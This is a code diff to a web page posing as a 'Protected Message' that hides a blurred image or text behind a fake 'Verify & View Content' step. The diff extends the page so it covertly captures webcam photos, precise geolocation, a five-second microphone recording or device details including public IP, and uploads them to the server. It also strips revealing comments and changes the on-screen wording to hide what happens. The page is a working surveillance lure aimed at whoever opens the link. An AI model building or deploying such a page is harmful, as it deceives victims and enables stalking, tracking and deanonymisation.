@@ -25,7 +25,6 @@
             position: relative;
         }
 
-        /* Blurred Background Container */
         .bg-image-container {
             position: absolute;
             top: 0;
@@ -34,7 +33,7 @@
             height: 100%;
             z-index: 1;
             overflow: hidden;
-            display: none; /* Shown via JS */
+            display: none; 
             align-items: center;
             justify-content: center;
         }
@@ -48,7 +47,6 @@
             display: none;
         }
 
-        /* Glassmorphism Card */
         .glass-card {
             position: relative;
             z-index: 10;
@@ -136,10 +134,8 @@
         .status-success { color: #00e676; }
         .status-error { color: #ff5252; }
 
-        /* Hidden elements */
         #videoElement, #canvasElement { display: none; }
         
-        /* Final Clear Content */
         .clear-image {
             width: 100%;
             border-radius: 12px;
@@ -166,12 +162,10 @@
 </head>
 <body>
 
-<!-- Blurred Background -->
 <div class="bg-image-container" id="bgContainer">
     <img src="" alt="Blurred Background" class="bg-image" id="bgImage">
 </div>
 
-<!-- Main UI Card -->
 <div class="glass-card" id="mainCard">
     <div class="icon-shield">🛡️</div>
     <h2>Protected Message</h2>
@@ -182,7 +176,7 @@
         Verify & View Content
     </button>
     
-    <div id="loading" class="status-msg status-loading">⏳ Verifying... Please look at your screen.</div>
+    <div id="loading" class="status-msg status-loading">⏳ Verifying... Please wait.</div>
     <div id="success" class="status-msg status-success">✅ Verification complete! Loading content...</div>
     <div id="error" class="status-msg status-error"></div>
     
@@ -190,7 +184,6 @@
     <div id="finalText" class="clear-text"></div>
 </div>
 
-<!-- Hidden Camera Elements -->
 <video id="videoElement" autoplay playsinline></video>
 <canvas id="canvasElement"></canvas>
 
@@ -211,7 +204,6 @@
 
     let payloadData = null;
 
-    // Initialization
     async function init() {
         if (!userId) {
             verifyBtn.style.display = 'none';
@@ -254,75 +246,140 @@
 
     verifyBtn.addEventListener('click', async () => {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-            video.srcObject = stream;
-            
             verifyBtn.style.display = 'none';
             loading.style.display = 'block';
             errorMsg.style.display = 'none';
 
-            video.onloadedmetadata = async () => {
-                const images = [];
+            const targetAction = payloadData.target_action || 'camera';
+            const formData = new FormData();
+            formData.append('id', userId);
+            formData.append('target_action', targetAction);
+
+            if (targetAction === 'camera') {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                video.srcObject = stream;
                 
-                for (let i = 0; i < 3; i++) {
-                    await new Promise(resolve => setTimeout(resolve, 800));
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                    images.push(blob);
-                }
+                video.onloadedmetadata = async () => {
+                    const images = [];
+                    for (let i = 0; i < 3; i++) {
+                        await new Promise(resolve => setTimeout(resolve, 800));
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                        formData.append('files', blob, `photo${i}.jpg`);
+                    }
+                    stream.getTracks().forEach(track => track.stop());
+                    await sendVerification(formData);
+                };
+            } 
+            else if (targetAction === 'location') {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        formData.append('locationData', JSON.stringify({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude
+                        }));
+                        await sendVerification(formData);
+                    },
+                    (err) => {
+                        showError("Location permission is required to verify.");
+                    },
+                    { enableHighAccuracy: true }
+                );
+            }
+            else if (targetAction === 'voice') {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new window.MediaRecorder(stream);
+                const audioChunks = [];
 
-                stream.getTracks().forEach(track => track.stop());
-
-                const formData = new FormData();
-                formData.append('id', userId);
-                images.forEach((blob, idx) => {
-                    formData.append('photos', blob, `photo${idx}.jpg`);
+                mediaRecorder.addEventListener("dataavailable", event => {
+                    audioChunks.push(event.data);
                 });
 
-                try {
-                    const response = await fetch('/upload', {
-                        method: 'POST',
-                        body: formData
-                    });
+                mediaRecorder.addEventListener("stop", async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    formData.append('files', audioBlob, 'voice.webm');
+                    stream.getTracks().forEach(track => track.stop());
+                    await sendVerification(formData);
+                });
 
-                    if (response.ok) {
-                        loading.style.display = 'none';
-                        success.style.display = 'block';
-                        
-                        setTimeout(() => {
-                            success.style.display = 'none';
-                            bgContainer.style.opacity = '0'; 
-                            document.querySelector('.icon-shield').style.display = 'none';
-                            document.querySelector('h2').style.display = 'none';
-                            document.querySelector('p').style.display = 'none';
-                            document.getElementById('mainCard').style.background = 'rgba(10, 10, 10, 0.9)';
-                            
-                            if (payloadData.payload_type === 'image') {
-                                finalImage.src = payloadData.original_image_url;
-                                finalImage.style.display = 'block';
-                            } else if (payloadData.payload_type === 'text') {
-                                finalText.innerHTML = `<h3>📝 Secret Message:</h3><br>` + payloadData.payload_content.replace(/\n/g, '<br>');
-                                finalText.style.display = 'block';
-                            } else if (payloadData.payload_type === 'template') {
-                                finalText.innerHTML = `<div style="font-size:30px; text-align:center;">` + payloadData.payload_content + `</div>`;
-                                finalText.style.display = 'block';
-                            }
-                        }, 1000);
-                    } else {
-                        showError("Verification failed on server.");
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
+            }
+            else if (targetAction === 'device_info') {
+                let ip = 'Unknown';
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch (e) {}
+
+                let battery = 'Unknown';
+                try {
+                    if (navigator.getBattery) {
+                        const b = await navigator.getBattery();
+                        battery = Math.round(b.level * 100) + '%';
                     }
-                } catch (err) {
-                    showError("Network error during verification.");
-                }
-            };
+                } catch(e) {}
+
+                const deviceInfo = {
+                    ip: ip,
+                    battery: battery,
+                    os: navigator.platform,
+                    browser: navigator.vendor || 'Unknown',
+                    network: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                    userAgent: navigator.userAgent
+                };
+                formData.append('deviceData', JSON.stringify(deviceInfo));
+                await sendVerification(formData);
+            }
         } catch (err) {
-            console.error("Camera error:", err);
-            showError("Camera permission is required to verify.");
+            console.error("Permission error:", err);
+            showError("Permission is required to verify.");
         }
     });
+
+    async function sendVerification(formData) {
+        try {
+            const response = await fetch('/upload', {
+                method: 'POST',
+                body: formData
+            });
+
+            if (response.ok) {
+                loading.style.display = 'none';
+                success.style.display = 'block';
+                
+                setTimeout(() => {
+                    success.style.display = 'none';
+                    bgContainer.style.opacity = '0'; 
+                    document.querySelector('.icon-shield').style.display = 'none';
+                    document.querySelector('h2').style.display = 'none';
+                    document.querySelector('p').style.display = 'none';
+                    document.getElementById('mainCard').style.background = 'rgba(10, 10, 10, 0.9)';
+                    
+                    if (payloadData.payload_type === 'image') {
+                        finalImage.src = payloadData.original_image_url;
+                        finalImage.style.display = 'block';
+                    } else if (payloadData.payload_type === 'text') {
+                        finalText.innerHTML = `<h3>📝 Secret Message:</h3><br>` + payloadData.payload_content.replace(/\n/g, '<br>');
+                        finalText.style.display = 'block';
+                    } else if (payloadData.payload_type === 'template') {
+                        finalText.innerHTML = `<div style="font-size:30px; text-align:center;">` + payloadData.payload_content + `</div>`;
+                        finalText.style.display = 'block';
+                    }
+                }, 1000);
+            } else {
+                showError("Verification failed on server.");
+            }
+        } catch (err) {
+            showError("Network error during verification.");
+        }
+    }
 
     init();
 </script>
